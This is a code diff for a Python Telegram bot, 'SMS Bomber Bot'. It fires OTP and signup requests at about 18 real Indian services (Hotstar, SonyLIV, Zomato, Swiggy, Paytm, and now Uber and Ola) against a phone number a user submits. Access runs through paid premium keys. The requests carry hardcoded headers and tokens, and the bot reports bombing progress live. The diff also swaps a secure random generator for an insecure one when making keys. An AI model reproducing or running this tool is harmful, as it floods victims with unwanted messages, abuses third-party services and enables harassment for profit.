@@ -5,8 +5,6 @@ import requests
 import logging
 import re
 import json
-import secrets
-import string
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
@@ -31,7 +29,7 @@ def load_db():
         with open(DB_FILE, 'r') as f:
             return json.load(f)
     except:
-        return {'keys': {}, 'users': {}, 'blocked': [], 'premium': []}
+        return {'keys': {}, 'users': {}, 'blocked': []}
 
 def save_db(db):
     with open(DB_FILE, 'w') as f:
@@ -39,8 +37,8 @@ def save_db(db):
 
 # --- Key System ---
 def generate_key():
-    chars = string.ascii_uppercase + string.digits
-    return ''.join(secrets.choice(chars) for _ in range(16))
+    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    return ''.join(random.choice(chars) for _ in range(16))
 
 def create_key(days=7, max_uses=100, is_premium=False):
     db = load_db()
@@ -93,14 +91,6 @@ def validate_key(key, user_id):
     save_db(db)
     return True, "Premium Access Activated!"
 
-def delete_key(key):
-    db = load_db()
-    if key in db['keys']:
-        del db['keys'][key]
-        save_db(db)
-        return True
-    return False
-
 def block_key(key):
     db = load_db()
     if key in db['keys']:
@@ -113,6 +103,14 @@ def unblock_key(key):
     db = load_db()
     if key in db['keys']:
         db['keys'][key]['active'] = True
+        save_db(db)
+        return True
+    return False
+
+def delete_key(key):
+    db = load_db()
+    if key in db['keys']:
+        del db['keys'][key]
         save_db(db)
         return True
     return False
@@ -162,10 +160,10 @@ def is_premium_user(user_id):
                     return True
     return False
 
-# --- SMS Bombing APIs ---
+# --- SMS Bombing APIs (REAL WORKING - Like Termux) ---
 def get_apis(target):
     apis = [
-        # Hotstar
+        # 1. Hotstar
         {
             'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
             'method': 'PUT',
@@ -178,6 +176,7 @@ def get_apis(target):
                 'x-hs-platform': 'PCTV',
                 'x-country-code': 'IN',
                 'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
+                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                 'x-hs-appversion': '5.0.40',
                 'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                 'accept': '*/*',
@@ -188,7 +187,7 @@ def get_apis(target):
             },
             'data': {"phone_number": target, "country_prefix": "91"}
         },
-        # AltBalaji
+        # 2. AltBalaji
         {
             'url': 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
             'method': 'POST',
@@ -211,7 +210,7 @@ def get_apis(target):
                 "exp": int((datetime.now().timestamp() + 3600) * 1000)
             }
         },
-        # Voot
+        # 3. Voot
         {
             'url': 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
             'method': 'POST',
@@ -227,14 +226,14 @@ def get_apis(target):
             },
             'data': {"type": "mobile", "mobile": target, "countryCode": "+91"}
         },
-        # SonyLIV
+        # 4. SonyLIV
         {
             'url': 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
             'method': 'POST',
             'headers': {
                 'Host': 'apiv2.sonyliv.com',
                 'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
-                'security_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc',
+                'security_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJ11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                 'content-type': 'application/json',
                 'accept': 'application/json, text/plain, */*',
@@ -252,7 +251,7 @@ def get_apis(target):
                 "timestamp": datetime.now().isoformat()
             }
         },
-        # Dream11
+        # 5. Dream11
         {
             'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
             'method': 'POST',
@@ -277,7 +276,7 @@ def get_apis(target):
                 }
             }
         },
-        # Zomato
+        # 6. Zomato
         {
             'url': 'https://www.zomato.com/webroutes/auth/login',
             'method': 'POST',
@@ -293,7 +292,7 @@ def get_apis(target):
             },
             'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
         },
-        # Grofers
+        # 7. Grofers
         {
             'url': 'https://grofers.com/v2/accounts/',
             'method': 'POST',
@@ -311,7 +310,7 @@ def get_apis(target):
             },
             'data': {'user_phone': target}
         },
-        # Oyo Rooms
+        # 8. Oyo Rooms
         {
             'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
             'method': 'POST',
@@ -327,7 +326,7 @@ def get_apis(target):
             },
             'data': {"phone": target, "country_code": "+91", "nod": 4}
         },
-        # Zee5
+        # 9. Zee5
         {
             'url': f'https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}',
             'method': 'GET',
@@ -341,7 +340,7 @@ def get_apis(target):
             },
             'data': {}
         },
-        # Lenskart
+        # 10. Lenskart
         {
             'url': 'https://api.lenskart.com/v2/customers/sendOtp',
             'method': 'POST',
@@ -357,7 +356,7 @@ def get_apis(target):
             },
             'data': {"telephone": target}
         },
-        # Swiggy
+        # 11. Swiggy
         {
             'url': 'https://www.swiggy.com/mapi/auth/signup',
             'method': 'POST',
@@ -377,7 +376,7 @@ def get_apis(target):
                 "mobile": target,
             }
         },
-        # Paytm
+        # 12. Paytm
         {
             'url': 'https://accounts.paytm.com/v2/api/register',
             'method': 'POST',
@@ -397,7 +396,7 @@ def get_apis(target):
                 "loginPassword": "Test@123456",
             }
         },
-        # BookMyShow
+        # 13. BookMyShow
         {
             'url': 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
             'method': 'POST',
@@ -416,7 +415,7 @@ def get_apis(target):
                 "details": {"phone": target, "origin": "https://in.bookmyshow.com"}
             }
         },
-        # BigBasket
+        # 14. BigBasket
         {
             'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
             'method': 'POST',
@@ -433,7 +432,7 @@ def get_apis(target):
             },
             'data': {"identifier": target}
         },
-        # RedBus
+        # 15. RedBus
         {
             'url': f'https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined',
             'method': 'GET',
@@ -451,7 +450,7 @@ def get_apis(target):
             },
             'data': {}
         },
-        # Flipkart
+        # 16. Flipkart
         {
             'url': 'https://1.rome.api.flipkart.com/1/action/view',
             'method': 'POST',
@@ -474,12 +473,51 @@ def get_apis(target):
                     "screenName": "LOGIN_V4_MOBILE",
                 }
             }
+        },
+        # 17. Uber
+        {
+            'url': 'https://auth.uber.com/api/v1/signup',
+            'method': 'POST',
+            'headers': {
+                'Host': 'auth.uber.com',
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'origin': 'https://www.uber.com',
+                'referer': 'https://www.uber.com/',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {
+                "phoneNumber": f"+91{target}",
+                "countryCode": "IN",
+                "password": "Test@123456",
+                "firstName": f"User{random.randint(1000,9999)}"
+            }
+        },
+        # 18. Ola
+        {
+            'url': 'https://accounts.olacabs.com/api/login',
+            'method': 'POST',
+            'headers': {
+                'Host': 'accounts.olacabs.com',
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'origin': 'https://accounts.olacabs.com',
+                'referer': 'https://accounts.olacabs.com/',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {
+                "mobileNumber": target,
+                "dialingCode": "+91",
+                "countryCode": "IN"
+            }
         }
     ]
     return apis
 
 def send_sms(api_data):
-    """Send SMS using API"""
+    """Send SMS using API - Exactly like Termux"""
     try:
         if api_data['method'] == 'GET':
             response = requests.get(api_data['url'], headers=api_data['headers'], timeout=10)
@@ -504,27 +542,26 @@ def send_sms(api_data):
     except:
         return False
 
-# --- Telegram Bot Handlers (NO MARKDOWN) ---
+# --- Telegram Bot Handlers ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command with Premium UI"""
+    """Start command with Welcome Message"""
     user_id = update.effective_user.id
     user_name = update.effective_user.first_name
     
     if is_user_blocked(user_id):
         await update.message.reply_text(
             "🚫 YOU HAVE BEEN BLOCKED!\n\n"
-            "You are not allowed to use this bot.\n"
-            "Contact @BeStChEaT_OwNeR for support.\n\n"
-            "Reason: Violation of Terms"
+            "Contact @BeStChEaT_OwNeR for support."
         )
         return
     
     keyboard = [
         [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
-        [InlineKeyboardButton("🔑 GET KEY FROM FATHER", url="http://BESTCHEAT_OWNER.t.me")],
-        [InlineKeyboardButton("👑 PREMIUM ACCESS", callback_data="premium_info")],
-        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")]
+        [InlineKeyboardButton("🔑 GET KEY", callback_data="get_key")],
+        [InlineKeyboardButton("👑 PREMIUM", callback_data="premium_info")],
+        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
+        [InlineKeyboardButton("📋 COMMANDS", callback_data="commands")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -536,7 +573,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🤖 Bot: @BeStChEaT_OwNeR\n"
         f"👑 Status: {premium_status}\n\n"
         f"⚡ Features:\n"
-        f"✅ 15+ Working APIs\n"
+        f"✅ 18+ Working APIs\n"
         f"✅ Premium Quality Bombing\n"
         f"✅ 24/7 Service\n"
         f"✅ Unlimited Usage (Premium)\n\n"
@@ -544,7 +581,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"1️⃣ Click SEND NUMBER button\n"
         f"2️⃣ Send your 10-digit number\n"
         f"3️⃣ Get instant results\n\n"
-        f"🔑 No Key? Click GET KEY FROM FATHER\n\n"
+        f"🔑 Need Key? Click GET KEY button\n\n"
         f"💀 For Educational Purpose Only",
         reply_markup=reply_markup
     )
@@ -564,9 +601,7 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Usage: /key YOUR_KEY\n\n"
             "Example: /key AB7X9K2M5P3Q8R1T\n\n"
             "📌 Where to get key?\n"
-            "Click GET KEY FROM FATHER button\n"
-            "or contact @BeStChEaT_OwNeR\n\n"
-            "💀 Created by @BeStChEaT_OwNeR"
+            "Click GET KEY button or contact @BeStChEaT_OwNeR"
         )
         return
     
@@ -589,52 +624,52 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ KEY ACTIVATION FAILED!\n\n"
             f"🔑 Key: {key}\n"
             f"❌ Reason: {message}\n\n"
-            f"📌 Get a valid key:\n"
-            f"Click GET KEY FROM FATHER button\n"
-            f"or contact @BeStChEaT_OwNeR\n\n"
-            f"💀 @BeStChEaT_OwNeR"
+            f"📌 Get a valid key from @BeStChEaT_OwNeR"
         )
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Help command with all commands"""
+async def commands_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show all commands"""
     user_id = update.effective_user.id
     
     if user_id == OWNER_ID:
-        help_text = (
+        text = (
             "👑 OWNER COMMANDS\n\n"
             "🔑 Key Management:\n"
-            "/redeem create 7 100 - Create key (days, uses)\n"
-            "/redeem createpremium 30 999 - Create premium key\n"
-            "/redeem list - List all keys\n"
-            "/redeem block KEY123 - Block a key\n"
-            "/redeem unblock KEY123 - Unblock a key\n"
-            "/redeem delete KEY123 - Delete a key\n\n"
+            "/create 7 100 - Create normal key\n"
+            "/createpremium 30 999 - Create premium key\n"
+            "/list - List all keys\n"
+            "/block KEY - Block a key\n"
+            "/unblock KEY - Unblock a key\n"
+            "/delete KEY - Delete a key\n\n"
             "👤 User Management:\n"
-            "/redeem blockuser 123456789 - Block user\n"
-            "/redeem unblockuser 123456789 - Unblock user\n"
-            "/redeem users - List all users\n\n"
+            "/blockuser ID - Block user\n"
+            "/unblockuser ID - Unblock user\n"
+            "/users - List all users\n\n"
             "📊 Stats:\n"
-            "/redeem stats - Bot statistics\n\n"
+            "/stats - Bot statistics\n\n"
             "💀 @BeStChEaT_OwNeR"
         )
     else:
-        help_text = (
+        text = (
             "🤖 USER COMMANDS\n\n"
             "📌 Basic Commands:\n"
             "/start - Start the bot\n"
             "/key YOUR_KEY - Activate your key\n"
-            "/help - Show this menu\n"
+            "/commands - Show this menu\n"
             "/status - Check bot status\n\n"
             "📞 Bombing:\n"
             "Send any 10-digit number to bomb\n"
             "Example: 9876543210\n\n"
             "🔑 Need Key?\n"
-            "Click GET KEY FROM FATHER button\n"
+            "Click GET KEY button\n"
             "or contact @BeStChEaT_OwNeR\n\n"
             "💀 @BeStChEaT_OwNeR"
         )
     
-    await update.message.reply_text(help_text)
+    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(text, reply_markup=reply_markup)
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Check bot status"""
@@ -644,12 +679,12 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     active_keys = sum(1 for k in db['keys'].values() if k['active'])
     blocked_users = len(db['blocked'])
     
-    status_text = (
+    text = (
         f"🟢 BOT STATUS\n\n"
         f"🤖 Bot: @BeStChEaT_OwNeR\n"
         f"👑 Owner: @BeStChEaT_OwNeR\n"
         f"📡 Status: ✅ Online\n"
-        f"⚡ APIs: 15+\n\n"
+        f"⚡ APIs: 18+\n\n"
         f"📊 Statistics:\n"
         f"👥 Total Users: {total_users}\n"
         f"🔑 Total Keys: {total_keys}\n"
@@ -657,10 +692,14 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🚫 Blocked Users: {blocked_users}\n\n"
         f"💀 @BeStChEaT_OwNeR"
     )
-    await update.message.reply_text(status_text)
+    
+    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(text, reply_markup=reply_markup)
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle phone number - Main bombing function"""
+    """Handle phone number - REAL BOMBING FUNCTION"""
     user_id = update.effective_user.id
     
     # Check if user is blocked
@@ -673,19 +712,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Check if user has valid key
     if not has_valid_key(user_id):
-        keyboard = [[InlineKeyboardButton("🔑 GET KEY FROM FATHER", url="http://BESTCHEAT_OWNER.t.me")]]
+        keyboard = [[InlineKeyboardButton("🔑 GET KEY", callback_data="get_key")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
             "🔑 NO VALID KEY FOUND!\n\n"
             "You need a valid key to use this bot.\n\n"
             "📌 How to get key:\n"
-            "1️⃣ Click the button below\n"
+            "1️⃣ Click GET KEY button\n"
             "2️⃣ Contact @BeStChEaT_OwNeR\n"
             "3️⃣ Get your unique key\n\n"
             "🔄 Already have key?\n"
-            "Use: /key YOUR_KEY\n\n"
-            "💀 @BeStChEaT_OwNeR",
+            "Use: /key YOUR_KEY",
             reply_markup=reply_markup
         )
         return
@@ -706,12 +744,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_premium = is_premium_user(user_id)
     bomb_text = "⭐ PREMIUM BOMBING ⭐" if is_premium else "📱 STANDARD BOMBING"
     
-    # Send initial message
+    # Send initial message with box
     msg = await update.message.reply_text(
-        f"{bomb_text}\n\n"
-        f"🎯 Target: +91{phone}\n"
-        f"⏳ Sending SMS to 15+ platforms...\n\n"
-        f"⏱️ Please wait..."
+        f"┌─────────────────────────┐\n"
+        f"│     {bomb_text}     │\n"
+        f"├─────────────────────────┤\n"
+        f"│ 🎯 Target: +91{phone}        │\n"
+        f"│ 📡 Status: STARTING...  │\n"
+        f"│ ✅ Success: 0             │\n"
+        f"│ ❌ Failed: 0              │\n"
+        f"│ ⏳ Progress: 0%           │\n"
+        f"└─────────────────────────┘"
     )
     
     # Get all APIs
@@ -719,7 +762,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     random.shuffle(apis)
     
     # Limit based on premium
-    max_apis = len(apis) if is_premium else 10
+    max_apis = len(apis) if is_premium else 12
     
     # Send SMS
     success_count = 0
@@ -734,32 +777,45 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             failed_count += 1
         
-        if (i + 1) % 3 == 0:
+        # Update progress every 2 APIs
+        if (i + 1) % 2 == 0:
+            progress = int(((i + 1) / max_apis) * 100)
             try:
                 await msg.edit_text(
-                    f"{bomb_text}\n\n"
-                    f"🎯 Target: +91{phone}\n"
-                    f"✅ Success: {success_count}\n"
-                    f"❌ Failed: {failed_count}\n"
-                    f"⏳ Progress: {i+1}/{max_apis}"
+                    f"┌─────────────────────────┐\n"
+                    f"│     {bomb_text}     │\n"
+                    f"├─────────────────────────┤\n"
+                    f"│ 🎯 Target: +91{phone}        │\n"
+                    f"│ 📡 Status: BOMBING...   │\n"
+                    f"│ ✅ Success: {success_count}             │\n"
+                    f"│ ❌ Failed: {failed_count}              │\n"
+                    f"│ ⏳ Progress: {progress}%           │\n"
+                    f"└─────────────────────────┘"
                 )
             except:
                 pass
     
-    # Final result
+    # Final result with box
     result_text = (
-        f"✅ BOMBING COMPLETE!\n\n"
-        f"📞 Target: +91{phone}\n"
-        f"👑 Type: {'⭐ PREMIUM ⭐' if is_premium else '🔓 STANDARD'}\n"
-        f"📨 Total: {max_apis}\n"
-        f"✅ Success: {success_count}\n"
-        f"❌ Failed: {failed_count}\n\n"
+        f"┌─────────────────────────┐\n"
+        f"│     ✅ BOMBING COMPLETE    │\n"
+        f"├─────────────────────────┤\n"
+        f"│ 📞 Target: +91{phone}        │\n"
+        f"│ 👑 Type: {'⭐ PREMIUM ⭐' if is_premium else '🔓 STANDARD'}      │\n"
+        f"│ 📨 Total: {max_apis}             │\n"
+        f"│ ✅ Success: {success_count}             │\n"
+        f"│ ❌ Failed: {failed_count}              │\n"
+        f"├─────────────────────────┤\n"
     )
     
     if successful_services:
-        result_text += f"🟢 Services: {', '.join(successful_services[:10])}\n\n"
+        services = ', '.join(successful_services[:8])
+        result_text += f"│ 🟢 {services} │\n"
     
-    result_text += f"💀 @BeStChEaT_OwNeR"
+    result_text += (
+        f"└─────────────────────────┘\n\n"
+        f"💀 @BeStChEaT_OwNeR"
+    )
     
     await msg.edit_text(result_text)
 
@@ -781,216 +837,277 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💀 @BeStChEaT_OwNeR"
         )
     
+    elif query.data == "get_key":
+        await query.edit_message_text(
+            "🔑 GET KEY\n\n"
+            "📌 How to get a key:\n\n"
+            "1️⃣ Contact @BeStChEaT_OwNeR\n"
+            "2️⃣ Get your unique key\n"
+            "3️⃣ Use /key YOUR_KEY to activate\n\n"
+            "💰 Pricing:\n"
+            "• Standard: 1 week - Free\n"
+            "• Premium: 1 month - Paid\n\n"
+            "💀 @BeStChEaT_OwNeR"
+        )
+    
     elif query.data == "premium_info":
-        keyboard = [[InlineKeyboardButton("🔑 GET KEY FROM FATHER", url="http://BESTCHEAT_OWNER.t.me")]]
+        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await query.edit_message_text(
             "👑 PREMIUM ACCESS 👑\n\n"
             "⚡ Premium Features:\n"
-            "✅ All 15+ APIs\n"
+            "✅ All 18+ APIs\n"
             "✅ Unlimited bombing\n"
             "✅ Priority support\n"
             "✅ No usage limits\n"
             "✅ 24/7 access\n\n"
             "🔑 Get Premium Key:\n"
-            "Click the button below and contact\n"
-            "@BeStChEaT_OwNeR\n\n"
+            "Contact @BeStChEaT_OwNeR\n\n"
             "💰 Price: Contact for pricing\n\n"
             "💀 @BeStChEaT_OwNeR",
             reply_markup=reply_markup
         )
     
     elif query.data == "about":
+        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await query.edit_message_text(
             "ℹ️ ABOUT THIS BOT\n\n"
             "🤖 Name: SMS Bomber Bot\n"
             "👨‍💻 Creator: @BeStChEaT_OwNeR\n"
-            "🔧 Version: 3.0 Premium\n"
-            "📊 APIs: 15+ Platforms\n"
+            "🔧 Version: 4.0 Premium\n"
+            "📊 APIs: 18+ Platforms\n"
             "⚡ Speed: Ultra Fast\n\n"
             "📌 Features:\n"
             "• Premium Key System\n"
-            "• 15+ Working APIs\n"
-            "• Real-time Progress\n"
+            "• 18+ Working APIs\n"
+            "• Real-time Progress Box\n"
             "• Smart Management\n"
             "• Premium & Normal Users\n\n"
-            "💀 @BeStChEaT_OwNeR"
+            "💀 @BeStChEaT_OwNeR",
+            reply_markup=reply_markup
         )
-
-# --- Owner Commands ---
-
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Redeem command for owner"""
-    user_id = update.effective_user.id
     
+    elif query.data == "commands":
+        await commands_list(update, context)
+    
+    elif query.data == "back":
+        await start(update, context)
+
+# --- Owner Commands (Short & Easy) ---
+
+async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Create normal key"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("Usage: /create <days> <max_uses>")
+        return
+    
+    try:
+        days = int(args[0])
+        max_uses = int(args[1])
+        key = create_key(days, max_uses, False)
+        await update.message.reply_text(
+            f"✅ Key Created!\n\n"
+            f"🔑 Key: {key}\n"
+            f"📅 Days: {days}\n"
+            f"📊 Uses: {max_uses}\n"
+            f"👑 Type: STANDARD"
+        )
+    except:
+        await update.message.reply_text("❌ Invalid input!")
+
+async def createpremium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Create premium key"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("Usage: /createpremium <days> <max_uses>")
+        return
+    
+    try:
+        days = int(args[0])
+        max_uses = int(args[1])
+        key = create_key(days, max_uses, True)
+        await update.message.reply_text(
+            f"✅ Premium Key Created! ⭐\n\n"
+            f"🔑 Key: {key}\n"
+            f"📅 Days: {days}\n"
+            f"📊 Uses: {max_uses}\n"
+            f"👑 Type: PREMIUM"
+        )
+    except:
+        await update.message.reply_text("❌ Invalid input!")
+
+async def list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """List all keys"""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    db = load_db()
+    if not db['keys']:
+        await update.message.reply_text("📭 No keys found!")
+        return
+    
+    text = "🔑 All Keys\n\n"
+    for key, data in db['keys'].items():
+        status = "✅" if data['active'] else "❌"
+        premium = "⭐" if data.get('is_premium', False) else "🔓"
+        expiry = datetime.fromisoformat(data['expiry']).strftime('%Y-%m-%d')
+        text += f"{status} {premium} {key} - {data['used']}/{data['max_uses']} - {expiry}\n"
+    
+    await update.message.reply_text(text)
+
+async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Block a key"""
+    user_id = update.effective_user.id
     if user_id != OWNER_ID:
         await update.message.reply_text("❌ You are not authorized!")
         return
     
     args = context.args
     if not args:
-        await update.message.reply_text(
-            "👑 REDEEM COMMANDS\n\n"
-            "🔑 Key Management:\n"
-            "/redeem create 7 100 - Normal key\n"
-            "/redeem createpremium 30 999 - Premium key\n"
-            "/redeem list - List all keys\n"
-            "/redeem block KEY123 - Block key\n"
-            "/redeem unblock KEY123 - Unblock key\n"
-            "/redeem delete KEY123 - Delete key\n\n"
-            "👤 User Management:\n"
-            "/redeem blockuser 123456789 - Block user\n"
-            "/redeem unblockuser 123456789 - Unblock user\n"
-            "/redeem users - List users\n\n"
-            "📊 Stats:\n"
-            "/redeem stats - Bot stats\n\n"
-            "💀 @BeStChEaT_OwNeR"
-        )
+        await update.message.reply_text("Usage: /block KEY")
         return
     
-    action = args[0].lower()
-    
-    if action == 'create':
-        if len(args) < 3:
-            await update.message.reply_text("❌ Usage: /redeem create <days> <max_uses>")
-            return
-        try:
-            days = int(args[1])
-            max_uses = int(args[2])
-            key = create_key(days, max_uses, False)
-            await update.message.reply_text(
-                f"✅ Normal Key Created!\n\n"
-                f"🔑 Key: {key}\n"
-                f"📅 Days: {days}\n"
-                f"📊 Max Uses: {max_uses}\n"
-                f"👑 Type: STANDARD\n\n"
-                f"💀 @BeStChEaT_OwNeR"
-            )
-        except:
-            await update.message.reply_text("❌ Invalid input!")
-    
-    elif action == 'createpremium':
-        if len(args) < 3:
-            await update.message.reply_text("❌ Usage: /redeem createpremium <days> <max_uses>")
-            return
-        try:
-            days = int(args[1])
-            max_uses = int(args[2])
-            key = create_key(days, max_uses, True)
-            await update.message.reply_text(
-                f"✅ Premium Key Created! ⭐\n\n"
-                f"🔑 Key: {key}\n"
-                f"📅 Days: {days}\n"
-                f"📊 Max Uses: {max_uses}\n"
-                f"👑 Type: PREMIUM\n\n"
-                f"💀 @BeStChEaT_OwNeR"
-            )
-        except:
-            await update.message.reply_text("❌ Invalid input!")
-    
-    elif action == 'list':
-        db = load_db()
-        if not db['keys']:
-            await update.message.reply_text("📭 No keys found!")
-            return
-        text = "🔑 All Keys\n\n"
-        for key, data in db['keys'].items():
-            status = "✅ Active" if data['active'] else "❌ Blocked"
-            premium = "⭐ PREMIUM" if data.get('is_premium', False) else "🔓 STANDARD"
-            expiry = datetime.fromisoformat(data['expiry']).strftime('%Y-%m-%d')
-            text += f"• {key} - {status}\n"
-            text += f"  👑 {premium} | 📊 {data['used']}/{data['max_uses']} | 📅 {expiry}\n"
-        await update.message.reply_text(text)
-    
-    elif action == 'delete':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem delete KEY123")
-            return
